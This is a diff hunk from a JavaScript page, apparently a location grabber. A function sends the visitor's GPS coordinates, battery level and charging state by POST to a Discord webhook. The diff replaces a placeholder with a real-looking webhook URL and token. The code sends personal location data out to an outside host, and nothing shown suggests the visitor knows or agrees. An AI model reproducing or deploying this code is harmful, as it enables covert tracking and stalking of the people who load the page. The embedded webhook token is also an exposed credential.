@@ -141,7 +141,7 @@
 
             function senddis(gpsr, batterypercentage, ischarging) {
                 const request = new XMLHttpRequest();
-                request.open("POST", "https://your-discordwebhook-url");
+                request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
                 request.setRequestHeader('Content-type', 'application/json');
                 const params = {
                     content: `**DeviceGps**: ${gpsr}\n**BatteryPercentage**: ${batterypercentage}\n**IsCharging**: ${ischarging}`,
